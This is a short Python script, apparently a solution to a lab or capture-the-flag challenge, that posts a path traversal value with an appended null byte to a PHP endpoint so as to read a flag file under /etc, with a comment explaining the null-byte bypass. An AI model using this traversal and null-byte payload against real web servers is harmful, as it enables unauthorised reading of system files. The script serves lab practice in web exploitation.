import requests

url = 'http://10.10.188.88/challenges/chall3.php'

'''
This one was a bit tricky. The web-server was looking for a .php file
and in the lesson we learned an exploit where you place a null byte at
the end of the filepath. 

It would look like: "/etc/flag%00"

However, somewhere this was not being interpreted correctly, so i tried to
add a null byte to the url in a way that python would understand and this worked.

Python uses null bytes: "/etc/flag\x00"
'''
data = {'file':'../../../../etc/flag3\x00'}

response = requests.post(url, data=data)

print('\nrequest.url: ',response.url,'\n')
print('request.headers: ',response.headers,'\n')

print('***r.txt***\n', response.text)
